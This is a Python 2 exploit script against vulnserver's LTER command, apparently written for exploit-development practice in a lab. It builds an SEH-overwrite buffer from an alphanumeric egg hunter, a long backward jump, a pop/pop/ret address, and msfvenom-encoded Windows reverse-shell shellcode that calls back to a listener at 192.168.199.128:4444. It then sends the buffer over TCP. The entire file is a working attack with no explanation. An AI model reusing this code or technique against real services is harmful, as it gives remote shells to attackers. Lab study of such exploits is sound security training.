import socket
import struct
import time
import binascii

print "\nLTER Command - Exploit, Egg hunter\n"

ip_addr = '192.168.199.130'
port = 9999

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################

command_str = "LTER /.:/"

# Egg Hunter
EGG = "T00W"
egg_hunter = "\x54\x58\x2d\x5d\x55\x55\x55\x2d\x5d\x55\x55\x55\x2d\x5e\x56\x55\x55\x50\x5c\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2d\x2e\x5d\x55\x5d\x2d\x2e\x5d\x55\x5d\x2d\x2f\x5e\x55\x5d\x50\x2d\x42\x25\x5c\x67\x2d\x42\x25\x5c\x67\x2d\x42\x27\x5d\x69\x50\x2d\x2a\x5f\x20\x48\x2d\x2a\x5f\x20\x48\x2d\x2b\x60\x20\x48\x50\x2d\x6b\x34\x66\x37\x2d\x6b\x34\x66\x37\x2d\x6b\x35\x68\x38\x50\x2d\x3b\x3b\x53\x3e\x2d\x3b\x3b\x53\x3e\x2d\x3d\x3d\x54\x3f\x50\x2d\x68\x39\x2e\x6c\x2d\x68\x39\x2e\x6c\x2d\x6a\x3a\x30\x6d\x50\x2d\x51\x5c\x28\x41\x2d\x51\x5c\x28\x41\x2d\x51\x5d\x2a\x42\x50\x2d\x38\x40\x2d\x23\x2d\x38\x40\x2d\x23\x2d\x39\x40\x2d\x24\x50" 

# Phrack Long Jump
phrack_jmp = "\x54\x58\x2d\x24\x4f\x55\x55\x2d\x24\x4f\x55\x55\x2d\x24\x50\x55\x55\x50\x5c\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2d\x56\x65\x55\x5f\x2d\x56\x65\x55\x5f\x2d\x56\x67\x55\x5f\x50\x2d\x51\x69\x55\x5b\x2d\x51\x69\x55\x5b\x2d\x52\x6b\x56\x5d\x50\x2d\x5c\x67\x29\x59\x2d\x5c\x67\x29\x59\x2d\x5e\x67\x2b\x5a\x50\x2d\x57\x2a\x59\x34\x2d\x57\x2a\x59\x34\x2d\x58\x2b\x59\x34\x50\x2d\x23\x4f\x71\x6e\x2d\x23\x4f\x71\x6e\x2d\x25\x4f\x71\x6e\x50"

# Shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 -e x86/alpha_mixed -b '\x00' BufferRegister=EDI -f c
shellcode = (
"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x7a\x48\x6b\x32\x75\x50"
"\x77\x70\x73\x30\x45\x30\x6d\x59\x6a\x45\x46\x51\x6f\x30\x55"
"\x34\x4e\x6b\x50\x50\x36\x50\x6c\x4b\x66\x32\x74\x4c\x6c\x4b"
"\x76\x32\x67\x64\x4e\x6b\x32\x52\x36\x48\x44\x4f\x6c\x77\x72"
"\x6a\x31\x36\x65\x61\x69\x6f\x6e\x4c\x55\x6c\x50\x61\x53\x4c"
"\x63\x32\x44\x6c\x67\x50\x39\x51\x6a\x6f\x44\x4d\x53\x31\x4a"
"\x67\x49\x72\x68\x72\x62\x72\x43\x67\x4e\x6b\x66\x32\x62\x30"
"\x4c\x4b\x51\x5a\x75\x6c\x6c\x4b\x62\x6c\x76\x71\x33\x48\x4d"
"\x33\x72\x68\x65\x51\x6b\x61\x30\x51\x6e\x6b\x72\x79\x75\x70"
"\x43\x31\x6e\x33\x4c\x4b\x70\x49\x65\x48\x4a\x43\x76\x5a\x72"
"\x69\x6e\x6b\x30\x34\x6e\x6b\x73\x31\x38\x56\x30\x31\x69\x6f"
"\x6c\x6c\x59\x51\x7a\x6f\x56\x6d\x77\x71\x4a\x67\x37\x48\x59"
"\x70\x74\x35\x7a\x56\x67\x73\x51\x6d\x6b\x48\x37\x4b\x73\x4d"
"\x34\x64\x74\x35\x4d\x34\x42\x78\x4c\x4b\x30\x58\x64\x64\x47"
"\x71\x4e\x33\x45\x36\x4c\x4b\x76\x6c\x70\x4b\x6c\x4b\x32\x78"
"\x35\x4c\x65\x51\x6a\x73\x6c\x4b\x34\x44\x6e\x6b\x46\x61\x78"
"\x50\x6c\x49\x51\x54\x44\x64\x36\x44\x63\x6b\x31\x4b\x55\x31"
"\x76\x39\x51\x4a\x72\x71\x79\x6f\x39\x70\x73\x6f\x73\x6f\x63"
"\x6a\x4c\x4b\x65\x42\x78\x6b\x6c\x4d\x33\x6d\x72\x48\x55\x63"
"\x57\x42\x33\x30\x47\x70\x75\x38\x74\x37\x61\x63\x37\x42\x63"
"\x6f\x56\x34\x51\x78\x32\x6c\x44\x37\x34\x66\x66\x67\x79\x6f"
"\x79\x45\x68\x38\x6c\x50\x43\x31\x75\x50\x75\x50\x74\x69\x58"
"\x44\x32\x74\x32\x70\x50\x68\x77\x59\x6b\x30\x62\x4b\x33\x30"
"\x79\x6f\x78\x55\x76\x30\x66\x30\x70\x50\x70\x50\x67\x30\x32"
"\x70\x73\x70\x70\x50\x75\x38\x4a\x4a\x34\x4f\x49\x4f\x4b\x50"
"\x4b\x4f\x7a\x75\x5a\x37\x50\x6a\x35\x55\x62\x48\x6f\x30\x4e"
"\x48\x69\x57\x6f\x70\x30\x68\x43\x32\x57\x70\x72\x31\x61\x4c"
"\x6e\x69\x49\x76\x51\x7a\x76\x70\x52\x76\x53\x67\x30\x68\x6e"
"\x79\x4f\x55\x34\x34\x75\x31\x69\x6f\x79\x45\x6b\x35\x4b\x70"
"\x73\x44\x44\x4c\x49\x6f\x52\x6e\x67\x78\x33\x45\x78\x6c\x43"
"\x58\x38\x70\x6e\x55\x6c\x62\x72\x76\x59\x6f\x4a\x75\x52\x48"
"\x75\x33\x32\x4d\x75\x34\x43\x30\x6e\x69\x4a\x43\x52\x77\x46"
"\x37\x63\x67\x34\x71\x79\x66\x33\x5a\x42\x32\x56\x39\x32\x76"
"\x38\x62\x4b\x4d\x52\x46\x5a\x67\x37\x34\x34\x64\x45\x6c\x73"
"\x31\x37\x71\x4c\x4d\x70\x44\x51\x34\x74\x50\x48\x46\x63\x30"
"\x73\x74\x43\x64\x56\x30\x32\x76\x63\x66\x56\x36\x42\x66\x51"
"\x46\x42\x6e\x46\x36\x43\x66\x63\x63\x30\x56\x73\x58\x63\x49"
"\x5a\x6c\x55\x6f\x4d\x56\x39\x6f\x59\x45\x4b\x39\x59\x70\x50"
"\x4e\x56\x36\x73\x76\x69\x6f\x66\x50\x62\x48\x56\x68\x6f\x77"
"\x37\x6d\x65\x30\x79\x6f\x4e\x35\x6f\x4b\x5a\x50\x38\x35\x59"
"\x32\x52\x76\x63\x58\x59\x36\x4a\x35\x4d\x6d\x4d\x4d\x6b\x4f"
"\x59\x45\x37\x4c\x45\x56\x53\x4c\x44\x4a\x4d\x50\x59\x6b\x6b"
"\x50\x50\x75\x47\x75\x4d\x6b\x47\x37\x54\x53\x50\x72\x72\x4f"
"\x73\x5a\x63\x30\x43\x63\x39\x6f\x38\x55\x41\x41"
)

# Jump If Carry flag is set or not set -128 up the stack 
nseh = '\x70\xFF\x71\xFF'

# Pop/Pop/Retn
seh = struct.pack("<I",0x6250120b) 

evil_buffer = command_str
evil_buffer += EGG + EGG + shellcode 
evil_buffer += 'A'*(3495-124-387-8-len(shellcode))
evil_buffer += egg_hunter + 'A'*(387-len(egg_hunter))
evil_buffer += phrack_jmp + 'A' * (124 - len(phrack_jmp)) 
evil_buffer += nseh + seh  + 'E'*(5000-3499-4)

send_evil_buffer(evil_buffer)
